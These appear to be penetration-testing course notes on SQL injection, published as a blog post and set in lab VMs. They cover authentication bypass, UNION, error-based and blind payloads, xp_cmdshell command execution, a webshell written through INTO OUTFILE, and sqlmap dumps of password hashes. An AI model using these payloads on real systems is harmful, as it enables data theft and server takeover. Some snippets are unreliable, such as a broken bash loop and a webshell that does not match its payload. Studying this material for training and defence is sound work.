@@ -1,0 +1,997 @@
+---
+title: "PEN-200 Module 10 \u2014 SQL Injection Field Notes"
+slug: sql-injection
+author: m4xx3d0ut
+summary: "This module escalates quickly from theory to exploitation. The detailed\
+  \ lab entries emphasize mapping the query, tuning payloads, and documenting impact.\
+  \ Here\u2019s the enriched playbook."
+publishedAt: '2023-08-30'
+updatedAt: '2024-01-01'
+readingMinutes: 58
+tags:
+- offsec
+---
+## TLDR;
+
+This module escalates quickly from theory to exploitation. The detailed lab entries emphasize mapping the query, tuning payloads, and documenting impact. Here’s the enriched playbook.
+
+### Recon the Query Structure
+
+1. Record endpoint, parameter, and HTTP method.
+2. Probe with safe payloads:
+   - `' OR 1=1--`
+   - `" OR "1"="1".
+   - `') ORDER BY 5--`
+3. Watch for error messages (syntax, type mismatch, database banners). Capture screenshots.
+
+```
+# Column count discovery
+tor='1 ORDER BY 1-- -'
+for i in $(seq 1 10); do
+  curl -s "https://portal.acme.local/product.php?id=${tor//$i/"$i"}" | grep -q "Server Error" && echo "Columns >= $i";
+done
+```
+
+### Enumerate with UNION
+
+- Find the number of columns using `ORDER BY n` or `UNION SELECT NULL,...` until the app stops erroring.
+- Replace `NULL` with diagnostics: `@@version`, `database()`, `user()`, `table_name` from `information_schema.tables`.
+
+```
+' UNION SELECT 1,2,3,@@version,5,6-- -
+' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
+```
+
+### Blind Techniques
+
+- Boolean: `AND 'a'='a'`, `AND (SELECT COUNT(*) FROM users) > 0`.
+- Time-based: `AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0)`.
+- Content-diff: measure response length differences.
+
+Log payloads and timing deltas; they evidence impact even without visible output.
+
+### Data Exfiltration & Code Exec
+
+- **MySQL:** `SELECT '<php code>' INTO OUTFILE '/var/www/html/shell.php'` (if file perms allow).
+- **SQL Server:** enable `xp_cmdshell` and launch PowerShell payloads.
+- **PostgreSQL:** `COPY (SELECT * FROM users) TO '/tmp/users.csv' WITH CSV`.
+
+Capture resulting shells or downloaded files as proof.
+
+### Automation Helpers
+
+Manual exploitation teaches you the structure; once mapped, pivot to `sqlmap` for breadth.
+
+```bash
+sqlmap -u "https://portal.acme.local/product.php?id=1" --batch --level=3 --risk=2 --dump -D acme -T users -C username,password
+```
+
+Store `sqlmap` audit logs and sanitized dumps; they belong in the technical appendix.
+
+### Defensive Guidance
+
+- Enforce prepared statements / parameterized queries.
+- Operate databases under least-privileged accounts.
+- Sanitize output to avoid leaking stack traces.
+- Monitor for anomalous query patterns (long running times, UNION bursts, failed logins).
+
+Module 10 rewards patience. Map the query by hand, record every payload, and automate only after you understand the data flow.
+
+## Working Notes... In Graphic Detail...
+
+#### SQL Injection Attacks
+
+- SQL Theory and Database Types.
+- Manual SQL Exploitation.
+- SQL Attack Automation.
+
+##### 10.1 SQL Theory and Databases 
+
+- Refresh SQL theory fundamentals.
+- Learn different DB types.
+- Understand different SQL syntax.
+
+###### SQL Theory Refresher
+
+Structured Query Language (SQL) has been developed specifically to manage and interact with data stored inside [relational databases](https://en.wikipedia.org/wiki/Relational_database).
+
+**Example:** parse user table and retrieve a specified user entry.
+
+```
+SELECT * FROM users WHERE user_name='noel'
+```
+
+Web apps automate functionality by embedding SQL queries in their source code, see the PHP example;
+
+```
+<?php
+$uname = $_POST['uname'];
+$passwd =$_POST['password'];
+
+$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
+$result = mysqli_query($con, $sql_query);
+?>
+```
+
+*Please note that the i inside the mysqli_query PHP function stands for improved and should not be confused with the vulnerability (as the i in SQLi stands for injection).*
+
+In order to search the database, the SQL server runs the query SELECT * FROM users WHERE user_name= noel. If, instead, the user enters "noel '+!@#$", the SQL server will run the query SELECT * FROM users WHERE user_name= noel'+!@#$. Nothing in our code block checks for these special characters, and it's this lack of filtering that causes the vulnerability.
+
+###### DB Types and Characteristics
+
+- We will not always know the type of underlying DB.
+ - Always be ready to ineract with different variants.
+ - Most common;
+		- [MySQL](https://www.mysql.com/)
+			- [MariaDB](https://mariadb.org/)
+    - Open Source variant.
+		- [MSSQL](http://www.microsoft.com/sqlserver)
+
+*The two SQL variants we're exploring in this Module are not limited to on-premise installations, as they can often be found in cloud deployments.*
+
+**MySQL & MariaDB Basics**
+- Connect to SQL instance.
+- Run version to retrieve version of running instance.
+- Verify current DB user.
+
+```bash
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ mysql -u root -p'root' -h 192.168.214.16 -P 3306 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 9
+Server version: 8.0.21 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> select version();
++-----------+
+| version() |
++-----------+
+| 8.0.21    |
++-----------+
+1 row in set (2.847 sec)
+
+MySQL [(none)]> select system_user();
++---------------------+
+| system_user()       |
++---------------------+
+| root@192.168.45.223 |
++---------------------+
+1 row in set (0.081 sec)
+
+MySQL [(none)]> 
+
+```
+
+- List DBs running on instance.
+- Retrieve password of offsec user in mysql DB.
+ - Stored with Caching-SHA-256.
+
+```
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| test               |
++--------------------+
+5 rows in set (0.467 sec)
+
+MySQL [(none)]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; 
++--------+------------------------------------------------------------------------+
+| user   | authentication_string                                                  |
++--------+------------------------------------------------------------------------+
+| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6 |
++--------+------------------------------------------------------------------------+
+1 row in set (0.081 sec)
+
+MySQL [(none)]> 
+```
+
+**MSSQL Basics**
+- Built in CLI.
+ - SQLCMD.
+ - Allows queries to be run through Win CMD.
+  - Or remotely from another system.
+- Kali includes Impacket.
+ - Python framework for network proto interactions.
+		- Supports Tabular Data Stream (TDS)
+   - Proto adopted by MSSQL.
+		- Implemented in `impacket-mssqlclient` tool.
+- Run `impacket-mssqlclient` to conn remote machine.
+ - Req options.
+  - Username.
+  - Password.
+  - Remote IP.
+  - Keyword `-windows-auth`
+   - Forces NTLM auth instead of Kerberos.
+- Inspect current version of the underlying OS `@@version`
+
+```bash
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ impacket-mssqlclient Administrator:Lab123@192.168.214.18 -windows-auth
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT @@version;
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+	Sep 24 2019 13:48:23 
+	Copyright (C) 2019 Microsoft Corporation
+	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
+
+```
+
+*When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by GO on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.*
+
+- Lista all available DBs.
+- Review DB by querying tables in the corresponding `information_schema`
+- Inspect table records, specify `dbo` schema between DB and table name!
+
+```
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
+name     
+------   
+master   
+
+tempdb   
+
+model    
+
+msdb     
+
+offsec   
+
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.information_schema.tables;
+TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
+-------------   ------------   ----------   ----------   
+offsec          dbo            users        b'BASE TABLE'   
+
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.dbo.users;
+username     password     
+----------   ----------   
+admin        lab          
+
+guest        guest        
+
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> 
+
+```
+
+*CLEAR TEXT PASSWORDS returned by query!*
+
+###### DB Types and Characteristics Exercises
+
+From your Kali Linux VM, connect to the remote MySQL instance on VM 1 and replicate the steps to enumerate the MySQL database. Then explore all values assigned to the user offsec. Which plugin value is used as a password authentication scheme?
+
+`caching_sha2_password`
+
+```
+MySQL [(none)]> SELECT * FROM mysql.user WHERE user = 'offsec';
++-----------+--------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
+| Host      | User   | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                                                  | password_expired | password_last_changed | password_lifetime | account_locked | Create_role_priv | Drop_role_priv | Password_reuse_history | Password_reuse_time | Password_require_current | User_attributes |
++-----------+--------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
+| localhost | offsec | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6 | N                | 2022-05-06 11:47:11   |              NULL | N              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |
++-----------+--------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
+1 row in set (2.432 sec)
+```
+
+From your Kali Linux VM, connect to the remote MSSQL instance on VM 2 and replicate the steps to enumerate the MSSQL database. Then explore the records of the sysusers table inside the master database. What is the value of the first user listed?
+
+```public
+```
+
+From your Kali Linux VM, connect to the remote MySQL instance on VM 3 and explore the users table present in one of the databases to get the flag.
+
+```
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| test               |
++--------------------+
+5 rows in set (0.086 sec)
+
+MySQL [(none)]> use test;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [test]> show tables;
++----------------+
+| Tables_in_test |
++----------------+
+| users          |
++----------------+
+1 row in set (0.081 sec)
+
+MySQL [test]> select * from users;
++----+--------------------------------------+
+| id | username                             |
++----+--------------------------------------+
+|  1 | yoshi                                |
+|  2 | luigi                                |
+|  3 | wario                                |
+|  4 | OS{1e1db601e36cab492a642a92c4bb1811} |
+|  5 | mario                                |
++----+--------------------------------------+
+5 rows in set (0.087 sec)
+
+```
+
+
+##### 10.2 SQL Theory and Databases
+
+- Manually identify SQL injection vulnerabilities.
+- Understand UNION SQLi payloads.
+- Learn about Error SQLi payloads.
+- Understand Blind SQLi payloads.
+
+###### Identifying SQLi via Error-based Payloads
+
+```
+<?php
+$uname = $_POST['uname'];
+$passwd =$_POST['password'];
+
+$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
+$result = mysqli_query($con, $sql_query);
+?>
+```
+
+- In the PHP snipped above.
+ - `uname` and `password` are user-supplied.
+  - This means we can control the `$sql_query` variable.
+   - Allows us to craft a new query!
+- In some cases SQLi can lead to auth bypass, the first vector we will explore.
+- By forcing the closing quote on `uname` and adding `OR 1=1` followed by a `--` comment seperator and `//` we can prematurely terminate the SQL statement.
+	- The syntax for this type of comment requires `//` followed by ` ` whitespace char.
+- Trailing the comments with `//` provides.
+ - Visibility on payload.
+ - Some protection agains whitespace truncation employed by web app.
+
+```
+offsec' OR 1=1 -- //
+```
+
+As a result, forwarde to SQL server;
+
+```
+SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
+```
+
+- The appended OR statement will always be true.
+- The WHERE clause will return the first user ID present in DB.
+ - Whether or not the record is present.
+- Because no other checks are implemented by app, we gain admin privs by circumventing auth logic!
+
+**Offsec - SQLi  Playground**
+- Enter user `offsec` password `jam`
+ - Invalid password message returned.
+- Insert special char `'` and try again.
+	- Error returned!
+
+```
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '5275cb415e5bc3948e8f2cd492859f26'' at line 1
+```
+
+*SQL injection is considered in-band when the vulnerable application provides the result of the query along with the application-returned value. In this scenario, we've enabled SQL debugging inside the web application; however, most production-level web applications won't show these error messages because revealing SQL debugging information is considered a security flaw.*
+
+- Given above result, try the auth bypass payload `offsec' OR 1=1 -- //`
+ - **Authentication Successfull!!!**.
+- We can also inject an arbitrary second statement.
+
+```
+' or 1=1 in (select @@version) -- //
+```
+
+- Version returned in Error!
+
+```
+Warning: 1292: Truncated incorrect DOUBLE value: '8.0.28'
+
+Authentication Successfull
+```
+
+*MySQL accepts both version() and @@version statements.*
+- We are able to query the DB interactively, as if we were at an admin terminal.
+- We can try to dump all of the data in the user tables;
+
+```
+' OR 1=1 in (SELECT * FROM users) -- //
+```
+
+- We return an error, telling us to query only one column at a time.
+
+```
+Error: Operand should contain 1 column(s)
+```
+
+- We will grab the passoword col.
+
+```
+' or 1=1 in (SELECT password FROM users) -- //
+```
+
+- Returns, what appear to be MD5 password hashes;
+
+```
+Warning: 1292: Truncated incorrect DOUBLE value: '21232f297a57a5a743894a0e4a801fc3' Warning: 1292: Truncated incorrect DOUBLE value: 'f9664ea1803311b35f81d07d8c9e072d' Warning: 1292: Truncated incorrect DOUBLE value: '5f4dcc3b5aa765d61d8327deb882cf99' Warning: 1292: Truncated incorrect DOUBLE value: '5653c6b1f51852a6351ec69c8452abc6'
+
+Invalid password!
+```
+
+- We don't know which hash corresponds to which user, we can retrieve admin directly;
+
+```
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+- The admin user MD5 has returns;
+
+```
+Warning: 1292: Truncated incorrect DOUBLE value: '21232f297a57a5a743894a0e4a801fc3'
+
+Invalid password!
+```
+
+**We have predictably fetched table data with the Error-Based SQLi vuln we discovered!**
+
+###### UNION-based Payloads
+
+- When dealing with in-band SQLi and the result of the query is returned along with the application-returned value;
+	- Test for UNION-BASED SQL Injection next!!!
+- [UNION](https://www.w3schools.com/sql/sql_union.asp) keyword.
+ - Enables an extra select statement in a single query.
+ - Providing both results.
+ - Concat both query into one statement.
+
+UNION SQLi requires two conditions to be true;
+- The injected UNION has the same number of cols as the original query.
+- Data types of the cols must be compatible.
+
+To demonstrate;
+
+```
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
+
+- [LIKE](https://www.w3schools.com/sql/sql_like.asp)
+- Before crafting attack we need to know the exact number of cols in the target table.
+ - The example output shows 4 cols, but we should not assume.
+ - There may be extra cols not displayed.
+- To discover the actual number of cols, inject;
+	- `' ORDER BY 1-- //`
+- The above statement orders the results by a specific col.
+ - It will fail when sel col does not exist.
+ - Inc the col val by 1 each time.
+
+```
+' ORDER BY 6-- //
+```
+
+Returns;
+
+```
+Unknown column '6' in 'order clause'
+```
+
+- Odering by col 6 returns an error.
+ - We have determined there are 5 cols.
+- With this info we can craft first attack.
+ - Since we want to use the customer table;
+		- `%'`
+ - Begin injected query with;
+		- `UNION SELECT`
+ - Statement dumps current DB, user, MySQL version in first, second, third col and leaves fourth, fifth NULL.
+		- `database(), user(), @@version, null, null -- //`
+
+```
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
+
+Returns;
+
+```
+Name	Phone	Address	Country
+Vladimir Vega	1-482-784-2019	900-5245 Ornare Ave	South Africa
+Xavier Wolf	(559) 271-7551	564-4427 Pede Road	Poland
+Lane Wooten	(684) 688-7367	562-4770 Gravida Road	Vietnam
+Laurel Chavez	(481) 611-0866	6184 Vivamus Ave	Singapore
+Holmes Griffith	(714) 669-5321	Ap #133-6689 Vestibulum Rd.	Singapore
+root@172.30.0.3	8.0.28
+```
+
+- Username and DB version on last line, but DB name is not.
+ - This happens because col 1 is typically reserved for an ID field of `integer` data type.
+  - It cannot return the string value through the `SELECT databse()` statement.
+   - *The web application is explicitly omitting the output from the first column because IDs are not usually useful information for end users.*.
+- Knowing this, shift enumerating functions to the right-most positions.
+ - Avoids type mismatches.
+ - *Since we verified the expected output, we can omit the % sign in our new query*.
+
+```
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+
+Returns;
+
+```
+Name	   Phone	   Address	Country
+offsec	   root@172.30.0.3	   8.0.28
+```
+
+- Values have returned correctly, showing `offsec` as the current DB.
+
+Extend this attack by verifying if other tables are present in the current DB!
+- Start by enumerating  the [information schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) of current DB.
+ - From the `information_schema.columns` table.
+- Attempt to obtain columns table from information_schema DB belonging to current DB.
+ - Store output in second, third, fourth cols leaving first, fifth NULL.
+
+```
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
+
+Returns;
+
+```
+Name	Phone	Address	Country
+customers	address	offsec	
+customers	country	offsec	
+customers	id	offsec	
+customers	name	offsec	
+customers	phone	offsec	
+users	description	offsec	
+users	id	offsec	
+users	password	offsec	
+users	username	offsec
+```
+
+- Output verifies that the three columns contain;
+ - Table name.
+ - Column name.
+ - Current DB name.
+- We also discover a new table, `users` , which includes four columns;
+ - Description.
+ - Id.
+  - Default int.
+ - Password.
+  - **interesting**.
+ - Username.
+- We can craft a new query to dump the users table;
+
+```
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+Returns;
+
+```
+Name	Phone	Address	Country
+admin	21232f297a57a5a743894a0e4a801fc3	this is the admin	
+offsec	f9664ea1803311b35f81d07d8c9e072d	try harder	
+boba	5f4dcc3b5aa765d61d8327deb882cf99	freeze	
+han	5653c6b1f51852a6351ec69c8452abc6	pew pew
+```
+
+Our UNION based payload has fetched the usenames and MD5 password hashes of the entire user table, including and admin account (huzzah!).
+*The MD5 vals can be reversed using appropriate tools.*
+
+###### Blind SQL Injections
+
+The SQLi payloads we have worked with so far are "in-band", meaning we retrieve the content of our query inside the web app.
+
+Blind SQLi is a case where responses are never returned.  Response is inferred using;
+- Boolean.
+- Time-based logic.
+
+Boolean-based blind SQL injection causes the app to return different predictible values whenever the DB returns TRUE or FALSE.
+*Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.*
+
+Time-based blind SQLi infer the query result by instructing the DB to wait for a specified amount of time.  Based on response time, we can conclude if the statement is TRUE or FALSE.
+
+Log into blind SQLi test page and notice that the URL takes a `user` param;
+
+```
+http://192.168.202.16/blindsqli.php?user=offsec
+```
+
+- This value defaults to the logged in user, offsec.
+- App prints the user record;
+ - Username.
+ - Password MD5 hash.
+ - Description.
+- To test for boolean-based SQLi we can append the following payload;
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+```
+
+- Since 1=1 is TRUE the app will return values only if the user is present in the DB.
+ - Using this syntax you could enumerate the entire DB.
+- With time based payload;
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
+
+- Note app hangs for 3 seconds before returning.
+ - TRUE.
+- Returns immediately.
+ - FALSE.
+*This type of attack is time consuming and should be automated through tools like SQLmap*
+
+###### 10.2 SQL Theory and Databases Excercises
+
+Boot up VM 1 and replicate the SQLi authentication bypass payload we have explored in this Learning Unit. In this section, which PHP variable is used to store user's input?
+
+```
+# See snippet below
+
+<?php
+$uname = $_POST['uname'];
+$passwd =$_POST['password'];
+
+$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
+$result = mysqli_query($con, $sql_query);
+?>
+
+# You would think $uname or $sql_query, this is wrong
+# $uname is assigned from the PHP variable, get it?
+
+$_POST    # <-- Is the variable that stores user input
+```
+
+Continue working on VM 1 and replicate the SQLi UNION-based attack we have discussed in this Learning Unit. For the UNION-based attack to succeed, what other condition needs to be satisfied in addition to having the same data types among the two queries?
+
+```
+Same number of columns
+```
+
+Replicate the time-based and boolean-based blind SQL injections described in this Learning Unit on the VM 1. Blind SQLi are called like this because the database output is never returned to the user. To infer the result of the query, the output of which component is employed instead?
+
+```
+# The output is infered by predictable results returned from the...
+web application
+```
+
+##### 10.3 Manual and Automated Code Execution
+
+- Exploit MSSQL Databases with xp_cmdshell.
+- Automate SQL Injection with SQLmap.
+
+###### Manual Code Execution
+
+**MSSQL**
+- Depending on the underlying DB system we are targeting we must adapt strategy to attain code exec.
+ - In MSSQL [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) function takes a string and passes it to a command shell for execution.
+ - Output returned as rows of text.
+ - NOTE: this funtion is disabled by default.
+  - Once enabled; must be called with EXECUTE keyword instead of SELECT.
+
+*In th example DB the Administrator user has the appropriate perms, enable xp_cmdshell by simulating SQLi via impacket-mssqlclient*
+
+```bash
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ impacket-mssqlclient Administrator:Lab123@192.168.209.18 -windows-auth
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
+```
+
+- After logging in as Administrator.
+ - We enable show advanced options by setting it to 1.
+ - Apply the changes with RECONFIGURE.
+ - Enable xp_cmdshell.
+ - Apply the config with RECONFIGURE.
+- With this feature enabled we can execute Win shell commands using the EXECUTE keyword followed by `xp_cmdshell` command name;
+
+```
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+output                        
+---------------------------   
+nt service\mssql$sqlexpress   
+
+NULL
+```
+
+- Since we now have full control over the system we can upgrade the SQL shell to a reverse shell.
+ - *MySQL DB variants don't offer a single func to escalate to RCE we can utilize [SELECT INTO_OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statment to write files to the server, as long as the location is writeable by the user running the DB*.
+
+**MySQL Variants**
+- Example: Using a UNION payload we will expand the query to write a webshell to disk.
+ - Issue UNION SELECT SQL keywords to include a single PHP line into the first col and save it as `webshell.php` in a writeable web folder;
+
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+- This results in a simple PHP reverse shell written to disk containing;
+
+```
+<? system($_REQUEST['cmd']); ?>
+```
+
+*The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.*
+- NOTE: You may see return type errors, this should not impact the webshell being written to disk so always check!
+- Confirm the webshell has written `http://192.168.209.19/tmp/webshell.php?cmd=id`
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data) \N \N \N \N
+```
+
+###### Automating the Attack
+
+- The SQLi techniques covered can be automated with several tools.
+ - Sqlmap.
+  - Can ID and exploit SQLi vulns against various DB engines.
+  - Set the URL we want to scan with `-u` and specify the parameter to test using `-p`
+
+```bash
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:23:34 /2023-09-01/
+
+[08:23:34] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://192.168.209.19/login1.php?msg=2'. Do you want to follow? [Y/n] 
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=8c85dj76cse...amvo797htl'). Do you want to use those [Y/n] 
+[08:23:59] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:23:59] [INFO] testing if the target URL content is stable
+[08:23:59] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
+[08:24:00] [INFO] testing for SQL injection on GET parameter 'user'
+[08:24:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:24:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:24:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:24:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[08:24:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[08:24:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[08:24:06] [INFO] testing 'Generic inline queries'
+[08:24:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[08:24:06] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
+[08:24:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[08:24:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[08:24:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:24:31] [INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+[08:25:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:25:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:25:08] [INFO] checking if the injection point on GET parameter 'user' is a false positive
+GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
+---
+Parameter: user (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 5276 FROM (SELECT(SLEEP(5)))EDkh) AND 'UGNi'='UGNi
+---
+[08:26:42] [INFO] the back-end DBMS is MySQL
+[08:26:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[08:26:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52, PHP
+back-end DBMS: MySQL >= 5.0.12
+[08:26:44] [INFO] fetched data logged to text files under '/home/operator/.local/share/sqlmap/output/192.168.209.19'
+
+[*] ending @ 08:26:44 /2023-09-01/
+```
+
